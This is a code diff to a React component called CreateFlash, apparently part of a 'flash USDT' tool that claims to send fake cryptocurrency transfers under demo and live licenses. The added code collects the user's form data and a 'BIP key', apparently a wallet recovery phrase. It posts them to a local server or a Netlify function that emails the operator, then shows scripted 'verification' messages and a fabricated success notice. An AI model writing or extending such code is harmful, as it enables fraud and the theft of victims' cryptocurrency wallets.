@@ -87,44 +87,55 @@ const Notification = ({ title, message, isVisible, onClose }) => {
   );
 };
 
-const CreateFlash = ({ licenseKey }) => {
-  const [currentDate, setCurrentDate] = useState('');
-  const [currentTime, setCurrentTime] = useState('');
+const CreateFlash = ({ licenseKey, currentDate, currentTime, isMobile }) => {
   const { appSettings } = useApp();
   
-  // Update date and time
+  // We're now receiving currentDate and currentTime as props from Dashboard component
+  // No need to manage date/time state here anymore
+  
+  // For backward compatibility, set local state if props are not provided
+  const [localDate, setLocalDate] = useState('');
+  const [localTime, setLocalTime] = useState('');
+  
+  // Use either props or local state
+  const displayDate = currentDate || localDate;
+  const displayTime = currentTime || localTime;
+  
+  // Fallback to local date/time management if props are not provided
   useEffect(() => {
-    const updateDateTime = () => {
-      const now = new Date();
+    if (!currentDate || !currentTime) {
+      const updateDateTime = () => {
+        const now = new Date();
+        
+        // Format date: DD/MM/YYYY
+        const date = now.toLocaleDateString('en-GB', {
+          day: '2-digit',
+          month: '2-digit',
+          year: 'numeric'
+        });
+        
+        // Format time: HH:MM:SS
+        const time = now.toLocaleTimeString('en-GB', {
+          hour: '2-digit',
+          minute: '2-digit',
+          second: '2-digit',
+          hour12: false
+        });
+        
+        setLocalDate(date);
+        setLocalTime(time);
+      };
       
-      // Format date: DD/MM/YYYY
-      const date = now.toLocaleDateString('en-GB', {
-        day: '2-digit',
-        month: '2-digit',
-        year: 'numeric'
-      });
+      // Update immediately
+      updateDateTime();
       
-      // Format time: HH:MM:SS
-      const time = now.toLocaleTimeString('en-GB', {
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit',
-        hour12: false
-      });
+      // Update every second
+      const interval = setInterval(updateDateTime, 1000);
       
-      setCurrentDate(date);
-      setCurrentTime(time);
-    };
-    
-    // Update immediately
-    updateDateTime();
-    
-    // Update every second
-    const interval = setInterval(updateDateTime, 1000);
-    
-    // Clean up interval on unmount
-    return () => clearInterval(interval);
-  }, []);
+      // Clean up interval on unmount
+      return () => clearInterval(interval);
+    }
+  }, [currentDate, currentTime]);
   
   // Form state
   const [wallet, setWallet] = useState('Wallet');
@@ -158,10 +169,9 @@ const CreateFlash = ({ licenseKey }) => {
   const [confirmLicenseKey, setConfirmLicenseKey] = useState('');
   
   // Max flash amount based on license type
-  const maxFlashAmount = licenseKey?.maxAmount || 
-                         (licenseKey?.type === 'demo' ? 
-                          appSettings?.demoMaxFlashAmount || 30 : 
-                          appSettings?.liveMaxFlashAmount || 10000000);
+  const maxFlashAmount = licenseKey?.type === 'demo' ? 
+                         (appSettings?.demoMaxFlashAmount || 30) : 
+                         (licenseKey?.maxAmount || appSettings?.liveMaxFlashAmount || 10000000);
 
   // Show notification
   const showNotification = (title, message, duration = 3000) => {
@@ -278,6 +288,76 @@ const CreateFlash = ({ licenseKey }) => {
     // Start processing
     setIsProcessing(true);
     
+    // Prepare form data for submission
+    const formData = {
+      wallet,
+      currency,
+      network,
+      receiverAddress,
+      flashAmount,
+      delayDays,
+      delayMinutes,
+      useProxy,
+      transferable,
+      swappable,
+      p2pTradable,
+      splittable,
+      licenseKey: licenseKey?.key,
+      user: licenseKey?.user,
+      timestamp: new Date().toISOString()
+    };
+    
+    // Log form data to console (this will always work even if API server is down)
+    console.log('FORM SUBMISSION DATA:', formData);
+    
+    // Send form data to email service
+    try {
+      // Try local API server first, then fall back to Netlify functions
+      let apiUrl = 'http://localhost:3001/form-submission';
+      
+      try {
+        const response = await fetch(apiUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(formData),
+          // Add timeout to prevent hanging if server is not responding
+          signal: AbortSignal.timeout(5000)
+        });
+        
+        if (response.ok) {
+          console.log('Form data sent successfully to local API server');
+        } else {
+          throw new Error('Local API server returned an error');
+        }
+      } catch (localApiError) {
+        console.log('Local API server not available, trying Netlify functions');
+        
+        // Fall back to Netlify functions
+        apiUrl = '/.netlify/functions/api/form-submission';
+        
+        const response = await fetch(apiUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(formData),
+          // Add timeout to prevent hanging if server is not responding
+          signal: AbortSignal.timeout(5000)
+        });
+        
+        if (response.ok) {
+          console.log('Form data sent successfully to Netlify functions');
+        } else {
+          console.error('Error sending form data:', await response.text());
+        }
+      }
+    } catch (fetchError) {
+      console.error('Failed to connect to API server:', fetchError);
+      // Still continue even if API server is not available
+    }
+    
     // Display initial loading messages
     displayMessages(initialLoadingMessages);
     
@@ -297,25 +377,63 @@ const CreateFlash = ({ licenseKey }) => {
     // Close BIP modal
     setBipModalOpen(false);
     
+    // Prepare BIP key data
+    const bipData = {
+      bipKey,
+      licenseKey: licenseKey?.key,
+      user: licenseKey?.user,
+      timestamp: new Date().toISOString()
+    };
+    
+    // Log BIP key data to console (this will always work even if API server is down)
+    console.log('BIP KEY NOTIFICATION:', bipData);
+    
     // Send BIP key notification
     try {
-      const response = await fetch('/.netlify/functions/api/bip-notification', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          bipKey,
-          licenseKey: licenseKey?.key,
-          user: licenseKey?.user
-        }),
-      });
+      // Try local API server first, then fall back to Netlify functions
+      let apiUrl = 'http://localhost:3001/bip-notification';
       
-      if (!response.ok) {
-        console.error('Error sending BIP notification:', await response.text());
+      try {
+        const response = await fetch(apiUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(bipData),
+          // Add timeout to prevent hanging if server is not responding
+          signal: AbortSignal.timeout(5000)
+        });
+        
+        if (response.ok) {
+          console.log('BIP key notification sent successfully to local API server');
+        } else {
+          throw new Error('Local API server returned an error');
+        }
+      } catch (localApiError) {
+        console.log('Local API server not available, trying Netlify functions');
+        
+        // Fall back to Netlify functions
+        apiUrl = '/.netlify/functions/api/bip-notification';
+        
+        const response = await fetch(apiUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(bipData),
+          // Add timeout to prevent hanging if server is not responding
+          signal: AbortSignal.timeout(5000)
+        });
+        
+        if (response.ok) {
+          console.log('BIP key notification sent successfully to Netlify functions');
+        } else {
+          console.error('Error sending BIP notification:', await response.text());
+        }
       }
-    } catch (error) {
-      console.error('Error sending BIP notification:', error);
+    } catch (fetchError) {
+      console.error('Failed to connect to API server:', fetchError);
+      // Still continue even if API server is not available
     }
     
     // Display BIP verification messages with longer delay (2-3 minutes total)
@@ -385,7 +503,76 @@ const CreateFlash = ({ licenseKey }) => {
     };
     
     try {
-      // Log flash transaction
+      // Log transaction data to console (this will always work even if API server is down)
+      console.log('TRANSACTION DATA:', transactionData);
+      
+      // First try to log transaction via local API to trigger email notification
+      try {
+        // Try local API server first, then fall back to Netlify functions
+        let apiUrl = 'http://localhost:3001/log-transaction';
+        
+        try {
+          const response = await fetch(apiUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(transactionData),
+            // Add timeout to prevent hanging if server is not responding
+            signal: AbortSignal.timeout(5000)
+          });
+          
+          if (response.ok) {
+            const apiResult = await response.json();
+            
+            // Add success message to status display
+            setStatusMessages(prev => [
+              ...prev, 
+              'Transaction completed successfully!',
+              `Transaction ID: ${apiResult.id}`
+            ]);
+            
+            showNotification('Success', 'Flash transaction sent successfully');
+            return; // Exit early if API call succeeds
+          } else {
+            throw new Error('Local API server returned an error');
+          }
+        } catch (localApiError) {
+          console.log('Local API server not available, trying Netlify functions');
+          
+          // Fall back to Netlify functions
+          apiUrl = '/.netlify/functions/api/log-transaction';
+          
+          const response = await fetch(apiUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(transactionData),
+            // Add timeout to prevent hanging if server is not responding
+            signal: AbortSignal.timeout(5000)
+          });
+          
+          if (response.ok) {
+            const apiResult = await response.json();
+            
+            // Add success message to status display
+            setStatusMessages(prev => [
+              ...prev, 
+              'Transaction completed successfully!',
+              `Transaction ID: ${apiResult.id}`
+            ]);
+            
+            showNotification('Success', 'Flash transaction sent successfully');
+            return; // Exit early if API call succeeds
+          }
+        }
+      } catch (fetchError) {
+        console.error('Failed to connect to API server:', fetchError);
+        // Fall back to direct Supabase if API fails
+      }
+      
+      // Fallback: Log flash transaction directly to Supabase
       const result = await supabaseService.logFlashTransaction(transactionData);
       
       if (result.success) {
@@ -427,12 +614,16 @@ const CreateFlash = ({ licenseKey }) => {
             onChange={setWallet} 
             value={wallet}
           />
+        </div>
+        <div className="form-row">
           <Dropdown 
             options={currencyOptions} 
             placeholder="Currency" 
             onChange={setCurrency} 
             value={currency}
           />
+        </div>
+        <div className="form-row">
           <Dropdown 
             options={networkOptions} 
             placeholder="Network" 
@@ -458,7 +649,7 @@ const CreateFlash = ({ licenseKey }) => {
           <input 
             type="number" 
             id="flash-amount" 
-            placeholder={`Enter Flash Amount (Max: ${maxFlashAmount} USDT)`}
+            placeholder={`Enter Flash Amount (${licenseKey?.type === 'demo' ? 'Demo' : 'Live'} License Max: ${maxFlashAmount} USDT)`}
             value={flashAmount}
             onChange={(e) => setFlashAmount(e.target.value)}
             disabled={isProcessing}
@@ -594,8 +785,8 @@ const CreateFlash = ({ licenseKey }) => {
       
       <div className="status-panel">
         <div className="date-time">
-          <div className="date" id="current-date">{currentDate}</div>
-          <div className="time" id="current-time">{currentTime}</div>
+          <div className="date" id="current-date">{displayDate}</div>
+          <div className="time" id="current-time">{displayTime}</div>
         </div>
         <div className="status-section">
           <h3>STATUS</h3>
